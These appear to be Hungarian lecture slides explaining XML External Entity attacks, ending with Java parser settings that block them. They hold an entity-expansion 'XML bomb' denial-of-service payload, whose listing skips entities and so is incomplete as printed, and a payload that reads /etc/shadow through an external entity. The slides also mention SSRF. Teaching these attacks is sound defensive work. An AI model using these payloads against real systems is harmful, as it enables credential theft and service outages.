
## XML External Entities (XEE)

---

## XML External Entities (XEE)

- A Document Type Definition (DTD) meghatározza a lehetséges elemeket és referenciákat

---

## XML External Entities (XEE)

- *A Document Type Definition (DTD) meghatározza a lehetséges elemeket és referenciákat*
- A DTD entity-ket és változókat deklarálhat

---

## XML External Entities (XEE)

- *A Document Type Definition (DTD) meghatározza a lehetséges elemeket és referenciákat*
- *A DTD entity-ket és változókat deklarálhat*
- Típusok

---

## XML External Entities (XEE)

- *A Document Type Definition (DTD) meghatározza a lehetséges elemeket és referenciákat*
- *A DTD entity-ket és változókat deklarálhat*
- *Típusok*
  - Előre definiált, pl: `&lt;`, `&gt;`

---

## XML External Entities (XEE)

- *A Document Type Definition (DTD) meghatározza a lehetséges elemeket és referenciákat*
- *A DTD entity-ket és változókat deklarálhat*
- *Típusok*
  - *Előre definiált, pl: `&lt;`, `&gt;`*
  - Internal: belső referenciák

---

## XML External Entities (XEE)

- *A Document Type Definition (DTD) meghatározza a lehetséges elemeket és referenciákat*
- *A DTD entity-ket és változókat deklarálhat*
- *Típusok*
  - *Előre definiált, pl: `&lt;`, `&gt;`*
  - *Internal: belső referenciák*
  - External: külső források: `<!ENTITY e &pointer>` kerül felülírásra

---

## XML External Entities (XEE)

### Példa: XML Bomb

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE attack [
<!ENTITY a "1234567890">
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;">
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;">
<!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;">
<!ENTITY l "&k;&k;&k;&k;&k;&k;&k;&k;">
<!ENTITY m "&l;&l;&l;&l;&l;&l;&l;&l;">
]>
<attack>&m;</attack>
```

---

## XML External Entities (XEE)

### Példa: XML Bomb

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE attack [
<!ENTITY a "1234567890">
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;">
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;">
<!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;">
<!ENTITY l "&k;&k;&k;&k;&k;&k;&k;&k;">
<!ENTITY m "&l;&l;&l;&l;&l;&l;&l;&l;">
]>
<attack>&m;</attack>
```

> A fenti példa ~650GB adatot generál!

---

## XML External Entities (XEE)

### Példa: külső fájl

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE updateProfile [
<!ENTITY file SYSTEM "file:///etc/shadow">
]>
<updateProfile>
  <firstname>Joe</firstname>
  <lastname>&file;</lastname>
</updateProfile>
```

---

## XML External Entities (XEE)

### Példa: külső fájl

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE updateProfile [
<!ENTITY file SYSTEM "file:///etc/shadow">
]>
<updateProfile>
  <firstname>Joe</firstname>
  <lastname>&file;</lastname>
</updateProfile>
```

> A külső erőforrás URL is lehet!
> Ezt hívjuk Server Side Request Forgery-nek (SSRF)

---

## XML External Entities (XEE)

### Példa: Billion Laughs

---

## XML External Entities (XEE)

### Példa: Expose Local File

---

## XEE Megoldások

- Secure mód
  ```java
  dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
  ```
- DTD letiltása
  ```java
  dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
  ```

---